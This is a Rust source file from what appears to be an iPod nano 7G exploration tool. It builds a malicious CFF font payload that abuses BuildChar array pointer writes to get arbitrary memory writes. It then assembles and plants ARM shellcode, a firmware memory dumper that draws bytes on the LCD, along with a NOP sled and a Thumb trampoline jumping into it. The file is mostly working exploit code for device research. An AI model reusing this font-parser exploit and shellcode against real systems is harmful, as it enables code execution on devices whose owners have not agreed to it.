use capstone::{arch, Capstone};
use capstone::arch::BuildsCapstone;
use crate::payload::{CffPayloadBuilder, Payload};
use crate::payload::exploit_config::ExploitConfig;
use keystone_engine::{Arch, Keystone, Mode};
use tracing::warn;

#[derive(Default)]
pub struct BinarySearch7gPayload {}

const TEST: bool = false;

impl Payload for BinarySearch7gPayload {
    fn build_cff<Cfg: ExploitConfig>(&self, b: &mut CffPayloadBuilder) {
        // Lets make sure we have lots of space
        // Not fully needed but should help with blind reliability
        b.index_write(Cfg::OFFSET_BUILDCHAR_LEN_PTR, i32::MAX as u32);

        // Set our write target to start of ram
        if !TEST {
            b.index_write(Cfg::OFFSET_BUILDCHAR_PTR, 0x0800_0000_u32);
        }



        //What do we know - n7g 1.1.2:
        // 0814_9590 is the addr of the usb string

        // Mem map:
        // 0800_0000 - 0800_0050 = shellcode (no Appl)
        // 0800_0050 - 0800_cfc8 = no Appl
        // 0800_cfc8 - 0800_cfcc = Appl                "Apple noise oc"
        // 0800_cfd0 - 0803_4fc8 = no Appl
        // 0803_4fc8 - 0803_4fcc = Appl                "Apple Inc.\0\0Manufactu"
        // 0803_4fcc - 0810_0000 = no Appl
        // 0814_9590 - 0814_9594 = Appl                "Apple Inc." With ipod mini nearby too :eyes:
        // Also at 0x22005018        "ARM/AppleMobil"
        // 0800EC4C "USB " tail end of some str
        // 08130ADC "USB Secondary"
        // 081E5350 "USB MSC" bingo!

        // 081e50c9 is just above msc string, from other fw, probably the UsbMSCTask func
        // 081e5130 is UsbMscBody
        // 081e4df0 is usb_stuff
        // 081992ec is handle scsi cmd
        // 081994f2 is c6 96 cmd if body




        if TEST {
            const BASE: u32 = 0x0814_9580;
            const STR_OFF: u16 = (0x0814_9590_u32 - BASE) as u16;

            b.index_write(Cfg::OFFSET_BUILDCHAR_PTR, BASE);

            b.index_swap(0, STR_OFF);

        }


        if !TEST {
            {
// LCD/font/some other stuff borrowed from ibugger
                const CODE: &'static str = r#"
start:
MSR CPSR_c, #0xD3          @ Supervisor mode, no IRQs, no FIQs

MOV R0, #0x00050000
ORR R0, #0x00000078
MCR p15, 0, R0, c1, c0, 0  @ Get rid of some CPU "features" likely to cause trouble

@    @ Find a value, print its address
@    @ Start range
@    ldr r1, =0x08130AE0
@    @ Tgt
@    ldr r3, =0x20425355
@    @ End Range
@    ldr r4, =0x08300000
@
@    _loop:
@    ldr r2, [r1]
@    subs r2, r2, r3
@    beq found
@    adds r1, #4
@    subs r2, r4, r1
@    beq nofound
@    b _loop
@
@    nofound:
@    MOV R0, #0x08500000
@    ADD R0, R0, #0xF00
@    LDR R1, val_color
@    ADR R3, not_found_msg
@    MVN R2, #1
@    BL rendertext
@    b print
@
@    found:
@    @ Put r1 (cur addr) in r9
@    @mov r9, r1
@    @SUBS R9, R9, #7
@    @SUBS R9, R9, #7
@    @SUBS R9, R9, #7
@    @SUBS R9, R9, #7
@
@    @ Store addr in tmp_buf_2
@    adr r0, tmp_buf_2
@    str r1, [r0]
@    @ Put ptr to tmp_buf_2 in r9, will leak the tmp buf
@    mov r9, r0


@ Src addr
@ldr r9, =0x0800cfc8
@ldr r9, =0x0800cfcf

@ldr r9, =0x08034fc8
@ldr r9, =0x08034fcf
@ldr r9, =0x8034fd6

@ldr r9, =0x22005018
@ldr r9, =0x2200501f


@ldr r9, =0x08000910
@ADDS R9, R9, #28
@ADDS R9, R9, #28
@ADDS R9, R9, #28
@ADDS R9, R9, #28
@ADDS R9, R9, #28
@ADDS R9, R9, #28
@ADDS R9, R9, #28

@ADDS R9, R9, #112
@
@ADDS R9, R9, #7
@ADDS R9, R9, #7
@ADDS R9, R9, #7
@
@ADDS R9, R9, #7
@ADDS R9, R9, #7
@ADDS R9, R9, #7

@ldr r9, =0x0800EC4C

@ldr r9, =0x08130ADC

@ldr r9, =0x081E5350
@SUBS r9, r9, #12


@ldr r9, =0x081e50c8
@SUBS r9, r9, #8
@ADDS r9, r9, #7

@@ UsbMscBody
@ldr r9, =0x081e5130
@ADDS r9, r9, #21
@ADDS r9, r9, #21
@ADDS r9, r9, #21

@ usb_stuff
@ldr r9, =0x081e4df0
@ADDS r9, r9, #28
@ADDS r9, r9, #28
@ADDS r9, r9, #28
@ADDS r9, r9, #28
@ADDS r9, r9, #28

@ldr r9, =0x081992ec
@ADDS r9, r9, #28
@ADDS r9, r9, #28
@ADDS r9, r9, #28
@ADDS r9, r9, #28


@ldr r9, =0x08199458
@ADDS r9, r9, #28

@ldr r9, =0x081994f2

ldr r9, =0x0819c458



@ Print line 0
ADR r0, tmp_buffer
@ Inc addr for easy read
add r0, r0, #1
MOV R5, #7
print_loop:

    @ 8-bit Value to print
    LDRB r2, [r9]

    @ Inc ptr
    ADD r9, r9, #1

    @ Char 0
    ADR r1, char_lookup      @ r1 = &char_lookup
    AND r3, r2, #3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1

    @ Char 1
    ADR r1, char_lookup      @ r1 = &char_lookup
    LSR r3, r2, #2           @ r3 = r2 >> 2
    AND r3, r3, #3           @ r3 = r3 & 3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1


    @ Char 2
    ADR r1, char_lookup      @ r1 = &char_lookup
    LSR r3, r2, #4           @ r3 = r2 >> 4
    AND r3, r3, #3           @ r3 = r3 & 3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1


    @ Char 3
    ADR r1, char_lookup      @ r1 = &char_lookup
    LSR r3, r2, #6           @ r3 = r2 >> 6
    AND r3, r3, #3           @ r3 = r3 & 3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1

    @ Blank space for reading
    add r0, r0, #1


    SUBS r5, r5, #1
BNE print_loop

push {r9}

@{
    @ Clear line 0
    MOV R0, #0x08500000
    LDR R1, val_color
    MVN R2, #1
    ADR R3, strings2
    BL rendertext

    @ Clear line 1
    MOV R0, #0x08500000
    ADD R0, R0, #0xF00
    ADR R3, strings2
    MVN R2, #1
    BL rendertext

    @ Clear line 2
    MOV R0, #0x08500000
    ADD R0, R0, #0x1E00
    ADR R3, strings2
    MVN R2, #1
    BL rendertext

    @ Print temp buffer (line = 1)
    MOV R0, #0x08500000
    ADD R0, R0, #0xF00
    ADR R3, tmp_buffer
    MVN R2, #1
    BL rendertext
@}

pop {r9}
ADR r0, tmp_buffer
@ Inc addr for easy read
add r0, r0, #1
MOV R5, #7
print_loop2:

    @ 8-bit Value to print
    LDRB r2, [r9]

    @ Inc ptr
    ADD r9, r9, #1

    @ Char 0
    ADR r1, char_lookup      @ r1 = &char_lookup
    AND r3, r2, #3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1

    @ Char 1
    ADR r1, char_lookup      @ r1 = &char_lookup
    LSR r3, r2, #2           @ r3 = r2 >> 2
    AND r3, r3, #3           @ r3 = r3 & 3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1


    @ Char 2
    ADR r1, char_lookup      @ r1 = &char_lookup
    LSR r3, r2, #4           @ r3 = r2 >> 4
    AND r3, r3, #3           @ r3 = r3 & 3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1


    @ Char 3
    ADR r1, char_lookup      @ r1 = &char_lookup
    LSR r3, r2, #6           @ r3 = r2 >> 6
    AND r3, r3, #3           @ r3 = r3 & 3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1

    @ Blank space for reading
    add r0, r0, #1


    SUBS r5, r5, #1
BNE print_loop2
push {r9}

@{
    @ Clear line 3
    MOV R0, #0x08500000
    ADD R0, R0, #0x2D00
    LDR R1, val_color
    MVN R2, #1
    ADR R3, strings2
    BL rendertext

    @ Clear line 4
    MOV R0, #0x08500000
    ADD R0, R0, #0x3C00
    ADR R3, strings2
    MVN R2, #1
    BL rendertext

    @ Print temp buffer (line = 3)
    MOV R0, #0x08500000
    ADD R0, R0, #0x2D00
    ADR R3, tmp_buffer
    MVN R2, #1
    BL rendertext
@}

pop {r9}
ADR r0, tmp_buffer
@ Inc addr for easy read
add r0, r0, #1
MOV R5, #7
print_loop3:

    @ 8-bit Value to print
    LDRB r2, [r9]

    @ Inc ptr
    ADD r9, r9, #1

    @ Char 0
    ADR r1, char_lookup      @ r1 = &char_lookup
    AND r3, r2, #3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1

    @ Char 1
    ADR r1, char_lookup      @ r1 = &char_lookup
    LSR r3, r2, #2           @ r3 = r2 >> 2
    AND r3, r3, #3           @ r3 = r3 & 3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1


    @ Char 2
    ADR r1, char_lookup      @ r1 = &char_lookup
    LSR r3, r2, #4           @ r3 = r2 >> 4
    AND r3, r3, #3           @ r3 = r3 & 3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1


    @ Char 3
    ADR r1, char_lookup      @ r1 = &char_lookup
    LSR r3, r2, #6           @ r3 = r2 >> 6
    AND r3, r3, #3           @ r3 = r3 & 3
    ADD r1, r1, r3           @ r1 = &char_lookup[r3]
    LDRB r1, [r1]            @ r1 = char_lookup[r3]
    STRB r1, [r0]
    add r0, r0, #1

    @ Blank space for reading
    add r0, r0, #1


    SUBS r5, r5, #1
BNE print_loop3
push {r9}

@{
    @ Clear line 5
    MOV R0, #0x08500000
    ADD R0, R0, #0x4B00
    LDR R1, val_color
    MVN R2, #1
    ADR R3, strings2
    BL rendertext

    @ Clear line 6
    MOV R0, #0x08500000
    ADD R0, R0, #0x5A00
    ADR R3, strings2
    MVN R2, #1
    BL rendertext

    @ Print temp buffer (line = 5)
    MOV R0, #0x08500000
    ADD R0, R0, #0x4B00
    ADR R3, tmp_buffer
    MVN R2, #1
    BL rendertext
@}

b data_pool_end

@ data pool

char_lookup:
.byte 0x41 @ A
.byte 0x53 @ S
.byte 0x44 @ D
.byte 0x46 @ F

tmp_buffer:
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x0

strings2:
.ascii "                                       \0"

not_found_msg:
.ascii "Cant find value    \0"

tmp_buf_2:
.byte 0x41
.byte 0x41
.byte 0x41
.byte 0x41

data_pool_end:


pop {r9}
ADR r0, tmp_buffer_2
@ Inc addr for easy read
add r0, r0, #1
MOV R5, #7
print_loop4:

     @ 8-bit Value to print
     LDRB r2, [r9]

     @ Inc ptr
     ADD r9, r9, #1

     @ Char 0
     ADR r1, char_lookup      @ r1 = &char_lookup
     AND r3, r2, #3
     ADD r1, r1, r3           @ r1 = &char_lookup[r3]
     LDRB r1, [r1]            @ r1 = char_lookup[r3]
     STRB r1, [r0]
     add r0, r0, #1

     @ Char 1
     ADR r1, char_lookup      @ r1 = &char_lookup
     LSR r3, r2, #2           @ r3 = r2 >> 2
     AND r3, r3, #3           @ r3 = r3 & 3
     ADD r1, r1, r3           @ r1 = &char_lookup[r3]
     LDRB r1, [r1]            @ r1 = char_lookup[r3]
     STRB r1, [r0]
     add r0, r0, #1


     @ Char 2
     ADR r1, char_lookup      @ r1 = &char_lookup
     LSR r3, r2, #4           @ r3 = r2 >> 4
     AND r3, r3, #3           @ r3 = r3 & 3
     ADD r1, r1, r3           @ r1 = &char_lookup[r3]
     LDRB r1, [r1]            @ r1 = char_lookup[r3]
     STRB r1, [r0]
     add r0, r0, #1


     @ Char 3
     ADR r1, char_lookup      @ r1 = &char_lookup
     LSR r3, r2, #6           @ r3 = r2 >> 6
     AND r3, r3, #3           @ r3 = r3 & 3
     ADD r1, r1, r3           @ r1 = &char_lookup[r3]
     LDRB r1, [r1]            @ r1 = char_lookup[r3]
     STRB r1, [r0]
     add r0, r0, #1

     @ Blank space for reading
     add r0, r0, #1


    SUBS r5, r5, #1
BNE print_loop4
push {r9}
@ @{

    @ Clear line 7
    MOV R0, #0x08500000
    ADD R0, R0, #0x6900
    LDR R1, val_color
    MVN R2, #1
    ADR R3, strings2
    BL rendertext

    @ Clear line 8
    MOV R0, #0x08500000
    ADD R0, R0, #0x7800
    ADR R3, strings2
    MVN R2, #1
    BL rendertext

    @ Print temp buffer (line = 7)
    MOV R0, #0x08500000
    ADD R0, R0, #0x6900
    ADR R3, tmp_buffer_2
    MVN R2, #1
    BL rendertext
@}

print:
MOV R2, #0x08500000
MOV R5, #0x00EF0000
MOV R9, #0x01000000
ADD R9, R9, #0x003F0000
BL displaylcd


hang:
b hang

sendlcdc:
  STRH R0, [R1,#0x04]
  B waitlcd
sendlcdd:
  STRH R0, [R1,#0x40]
waitlcd:
  LDRH R0, [R1, #0x1C]
  ANDS R0, R0, #0x10
  BNE waitlcd
MOV PC, LR

displaylcd:
  MOV R7, LR
  MOV R1, #0x38000000
  ADD R1, R1, #0x00300000
  MOV R0, #0x2A
  BL sendlcdc
  MOV R0, R5
  BL sendlcdd
  MOV R0, R5,LSR#16
  BL sendlcdd
  MOV R0, #0x2B
  BL sendlcdc
  MOV R0, R9
  TST R0, #0x100
  EORNE R0, R0, #0x300  @ WTF... But it's neccessary.
  BL sendlcdd
  MOV R0, R9,LSR#16
  TST R0, #0x100
  EORNE R0, R0, #0x300  @ WTF... But it's neccessary.
  BL sendlcdd
  MOV R0, #0x2C
  BL sendlcdc
  MOV R0, R5,LSR#16
  MOV R12, R5,LSL#16
  SUB R0, R0, R12,LSR#16
  ADD R0, R0, #1
  MOV R5, R9,LSR#16
  MOV R12, R9,LSL#16
  SUB R5, R5, R12,LSR#16
  ADD R5, R5, #1
  MUL R12, R0, R5
  loop:
    LDRH R0, [R2]
    TST R2, #0x40000000
    ADDEQ R2, R2, #2
    BL sendlcdd
    SUBS R12, R12, #1
  BNE loop
MOV PC, R7

rendertext:
  ldrb r12, [r3], #1
  cmp r12, #0
  moveq pc, lr
  cmn r2, #1
  beq rendernobg
    mov r6, r0
    mov r4, #8
    renderbgrow:
      mov r5, #6
      renderbgcol:
        cmn r2, #2
        ldrheq r7, [r6]
       moveq r7, r7,lsr#1
        biceq r7, #0x410
        strheq r7, [r6], #2
        strhne r2, [r6], #2
        subs r5, r5, #1
      bne renderbgcol
     add r6, r6, #468
     subs r4, r4, #1
    bne renderbgrow
  rendernobg:
  adr r5, font
  sub r12, r12, #0x20
  cmp r12, #0x5f
  addcc r5, r12,lsl#2
  addcc r5, r12
  mov r12, #5
  rendercol:
      mov r6, r0
      ldrb r4, [r5], #1
    renderrow:
     tst r4, #1
     strhne r1, [r6]
     add r6, r6, #480
     movs r4, r4,lsr#1
    bne renderrow
    add r0, r0, #2
    subs r12, r12, #1
  bne rendercol
  add r0, r0, #2
b rendertext


tmp_buffer_2:
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20
.byte 0x20

.byte 0x0

val_color:
.word 0xFFE0



.align 2

font:
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 0
.byte 95
.byte 0
.byte 0
.byte 0
.byte 7
.byte 0
.byte 7
.byte 0
.byte 20
.byte 127
.byte 20
.byte 127
.byte 20
.byte 36
.byte 42
.byte 127
.byte 42
.byte 18
.byte 35
.byte 19
.byte 8
.byte 100
.byte 98
.byte 54
.byte 73
.byte 85
.byte 34
.byte 80
.byte 5
.byte 3
.byte 0
.byte 0
.byte 0
.byte 28
.byte 34
.byte 65
.byte 0
.byte 0
.byte 0
.byte 0
.byte 65
.byte 34
.byte 28
.byte 20
.byte 8
.byte 62
.byte 8
.byte 20
.byte 8
.byte 8
.byte 62
.byte 8
.byte 8
.byte 0
.byte -96
.byte 96
.byte 0
.byte 0
.byte 8
.byte 8
.byte 8
.byte 8
.byte 8
.byte 0
.byte 96
.byte 96
.byte 0
.byte 0
.byte 32
.byte 16
.byte 8
.byte 4
.byte 2
.byte 62
.byte 81
.byte 73
.byte 69
.byte 62
.byte 0
.byte 66
.byte 127
.byte 64
.byte 0
.byte 66
.byte 97
.byte 81
.byte 73
.byte 70
.byte 33
.byte 65
.byte 69
.byte 75
.byte 49
.byte 24
.byte 20
.byte 18
.byte 127
.byte 16
.byte 39
.byte 69
.byte 69
.byte 69
.byte 57
.byte 60
.byte 74
.byte 73
.byte 73
.byte 48
.byte 1
.byte 113
.byte 9
.byte 5
.byte 3
.byte 54
.byte 73
.byte 73
.byte 73
.byte 54
.byte 6
.byte 73
.byte 73
.byte 41
.byte 30
.byte 0
.byte 54
.byte 54
.byte 0
.byte 0
.byte 0
.byte 86
.byte 54
.byte 0
.byte 0
.byte 8
.byte 20
.byte 34
.byte 65
.byte 0
.byte 20
.byte 20
.byte 20
.byte 20
.byte 20
.byte 0
.byte 65
.byte 34
.byte 20
.byte 8
.byte 2
.byte 1
.byte 81
.byte 9
.byte 6
.byte 50
.byte 73
.byte 121
.byte 65
.byte 62
.byte 124
.byte 18
.byte 17
.byte 18
.byte 124
.byte 127
.byte 73
.byte 73
.byte 73
.byte 62
.byte 62
.byte 65
.byte 65
.byte 65
.byte 34
.byte 127
.byte 65
.byte 65
.byte 34
.byte 28
.byte 127
.byte 73
.byte 73
.byte 73
.byte 65
.byte 127
.byte 9
.byte 9
.byte 9
.byte 1
.byte 62
.byte 65
.byte 73
.byte 73
.byte 58
.byte 127
.byte 8
.byte 8
.byte 8
.byte 127
.byte 0
.byte 65
.byte 127
.byte 65
.byte 0
.byte 32
.byte 64
.byte 65
.byte 63
.byte 1
.byte 127
.byte 8
.byte 20
.byte 34
.byte 65
.byte 127
.byte 64
.byte 64
.byte 64
.byte 64
.byte 127
.byte 2
.byte 12
.byte 2
.byte 127
.byte 127
.byte 4
.byte 8
.byte 16
.byte 127
.byte 62
.byte 65
.byte 65
.byte 65
.byte 62
.byte 127
.byte 9
.byte 9
.byte 9
.byte 6
.byte 62
.byte 65
.byte 81
.byte 33
.byte 94
.byte 127
.byte 9
.byte 25
.byte 41
.byte 70
.byte 38
.byte 73
.byte 73
.byte 73
.byte 50
.byte 1
.byte 1
.byte 127
.byte 1
.byte 1
.byte 63
.byte 64
.byte 64
.byte 64
.byte 63
.byte 31
.byte 32
.byte 64
.byte 32
.byte 31
.byte 127
.byte 32
.byte 24
.byte 32
.byte 127
.byte 99
.byte 20
.byte 8
.byte 20
.byte 99
.byte 3
.byte 4
.byte 120
.byte 4
.byte 3
.byte 97
.byte 81
.byte 73
.byte 69
.byte 67
.byte 0
.byte 127
.byte 65
.byte 65
.byte 0
.byte 2
.byte 4
.byte 8
.byte 16
.byte 32
.byte 0
.byte 65
.byte 65
.byte 127
.byte 0
.byte 4
.byte 2
.byte 1
.byte 2
.byte 4
.byte 64
.byte 64
.byte 64
.byte 64
.byte 64
.byte 1
.byte 2
.byte 4
.byte 0
.byte 0
.byte 32
.byte 84
.byte 84
.byte 84
.byte 120
.byte 127
.byte 68
.byte 68
.byte 68
.byte 56
.byte 56
.byte 68
.byte 68
.byte 68
.byte 40
.byte 56
.byte 68
.byte 68
.byte 68
.byte 127
.byte 56
.byte 84
.byte 84
.byte 84
.byte 24
.byte 8
.byte 126
.byte 9
.byte 1
.byte 2
.byte 8
.byte 84
.byte 84
.byte 84
.byte 60
.byte 127
.byte 4
.byte 4
.byte 4
.byte 120
.byte 0
.byte 68
.byte 125
.byte 64
.byte 0
.byte 32
.byte 64
.byte 64
.byte 61
.byte 0
.byte 127
.byte 16
.byte 40
.byte 68
.byte 0
.byte 0
.byte 65
.byte 127
.byte 64
.byte 0
.byte 124
.byte 4
.byte 24
.byte 4
.byte 120
.byte 124
.byte 8
.byte 4
.byte 4
.byte 120
.byte 56
.byte 68
.byte 68
.byte 68
.byte 56
.byte 124
.byte 20
.byte 20
.byte 20
.byte 24
.byte 8
.byte 20
.byte 20
.byte 20
.byte 124
.byte 124
.byte 8
.byte 4
.byte 4
.byte 8
.byte 72
.byte 84
.byte 84
.byte 84
.byte 32
.byte 4
.byte 63
.byte 68
.byte 64
.byte 32
.byte 60
.byte 64
.byte 64
.byte 32
.byte 124
.byte 28
.byte 32
.byte 64
.byte 32
.byte 28
.byte 60
.byte 64
.byte 56
.byte 64
.byte 60
.byte 68
.byte 40
.byte 16
.byte 40
.byte 68
.byte 12
.byte 80
.byte 80
.byte 80
.byte 60
.byte 68
.byte 100
.byte 84
.byte 76
.byte 68
.byte 0
.byte 8
.byte 54
.byte 65
.byte 0
.byte 0
.byte 0
.byte 119
.byte 0
.byte 0
.byte 0
.byte 65
.byte 54
.byte 8
.byte 0
.byte 2
.byte 1
.byte 2
.byte 4
.byte 2
"#;

                /*
                @ldr r1, =0x22005018
@ldr r3, =0x6c707041
@ldr r4, =0x2200501c
@
@_loop:
@ldr r2, [r1]
@subs r2, r2, r3
@beq hang
@adds r1, #4
@subs r2, r4, r1
@beq crash
@b _loop
@
@hang:
@b hang
@
@crash:
@ldr r0, =0x08000000
@blx r0
                 */

                let engine =
                    Keystone::new(Arch::ARM, Mode::ARM).expect("Could not initialize Keystone engine");

                let result = engine
                    .asm(CODE.to_string(), 0)
                    .expect("Could not assemble");

                warn!("Stage2 size = 0x{:x}", result.bytes.len());

                for (i, x) in result.bytes.chunks(4).enumerate() {
                    println!("{:08x} {:02x?}", 0x0800_0000 + i, x);
                }

                for (idx, t) in result.bytes.chunks(4).enumerate() {
                    let mut tmp = [0u8, 0, 0, 0];
                    tmp[..t.len()].copy_from_slice(t);

                    b.index_write_array(idx as u16, tmp);
                }
            }

            {
                let mut tmp = Vec::new();

                // Nop sled

                // Shellcode
                {
                    // 64

                    for _ in 0..(8) {
                        tmp.extend_from_slice(&[0xc0, 0x46] /* nop*/);
                    }

                    let engine =
                        Keystone::new(Arch::ARM, Mode::THUMB).expect("Could not initialize Keystone engine");

                    const CODE: &'static str = r#"
push {r2}
ldr r2, =0x08000000
bx r2
            "#;

                    let result = engine
                        .asm(CODE.to_string(), 0)
                        .expect("Could not assemble");


                    tmp.extend_from_slice(&result.bytes);

                    for (i, x) in tmp.chunks(4).enumerate() {
                        println!("{:08x} {:02x?}", 0x0800_0000 + i, x);
                    }

                    println!("----");

                    for (i, x) in result.bytes.chunks(4).enumerate() {
                        println!("{:08x} {:02x?}", 0x0800_0000 + 0x400 + i * 4, x);
                    }

                    {
                        let cs = Capstone::new()
                            .arm()
                            .mode(arch::arm::ArchMode::Thumb)
                            .detail(true)
                            .build()
                            .expect("Failed to create Capstone object");

                        let insns = cs.disasm_all(&result.bytes, 0x1000)
                            .expect("Failed to disassemble");

                        for i in insns.as_ref() {
                            println!("{}", i);
                        }
                    }
                }


                for (idx, t) in tmp.chunks(4).enumerate() {
                    let mut tmp = [0u8, 0, 0, 0];
                    tmp[..t.len()].copy_from_slice(t);

                    // 0x10
                    // 0x40
                    let off = 0x900 + 8 * 2;
                    assert_eq!(off % 2, 0, "WTF");
                    b.index_write_array(idx as u16 + off / 4, tmp);
                }
            }
        }
    }
}